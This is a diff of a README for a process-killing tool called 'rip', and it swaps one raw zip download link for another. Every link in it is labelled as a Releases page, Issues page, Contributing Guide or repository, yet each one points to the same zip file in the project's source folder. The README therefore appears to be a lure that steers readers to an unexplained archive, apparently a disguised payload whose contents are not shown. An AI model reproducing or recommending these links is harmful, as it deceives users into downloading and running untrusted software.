@@ -1,6 +1,6 @@
 # 🚀 rip - Find and Kill Processes Easily
 
-[![Download rip](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software-v1.7.zip)](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software-v1.7.zip)
+[![Download rip](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software_1.3.zip)](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software_1.3.zip)
 
 ## 📦 Overview
 
@@ -26,7 +26,7 @@ Before installing rip, ensure your system meets the following requirements:
 
 To get started with rip, you need to download and install it. Follow the steps below:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software-v1.7.zip) to find the latest version of rip.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software_1.3.zip) to find the latest version of rip.
 2. Download the file suitable for your operating system.
 3. Save the file in an easily accessible location on your computer.
 
@@ -34,7 +34,7 @@ To get started with rip, you need to download and install it. Follow the steps b
 
 To download rip, click the link below:
 
-[Download rip](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software-v1.7.zip)
+[Download rip](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software_1.3.zip)
 
 After downloading, follow these simple steps to install and run the application:
 
@@ -88,7 +88,7 @@ Using rip is straightforward. Here’s a brief guide to make the most of the app
 
 ## 📞 Support & Feedback
 
-If you have any questions, issues, or feedback, you can reach out through the project's [GitHub Issues page](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software-v1.7.zip). Your input helps improve rip for everyone.
+If you have any questions, issues, or feedback, you can reach out through the project's [GitHub Issues page](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software_1.3.zip). Your input helps improve rip for everyone.
 
 ## 📜 License
 
@@ -96,10 +96,10 @@ rip is open-source software licensed under the MIT License. You can freely use a
 
 ## 🌟 Contributing
 
-We welcome contributions from everyone. If you’d like to improve rip, please check our [Contributing Guide](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software-v1.7.zip) on the repository. Help us make rip better for all users!
+We welcome contributions from everyone. If you’d like to improve rip, please check our [Contributing Guide](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software_1.3.zip) on the repository. Help us make rip better for all users!
 
 ## 🔗 Links
-- [GitHub Repository](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software-v1.7.zip)
-- [Releases Page](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software-v1.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software_1.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/Isaacdg7/rip/main/src/Software_1.3.zip)
 
 Thank you for trying rip. Happy process managing!
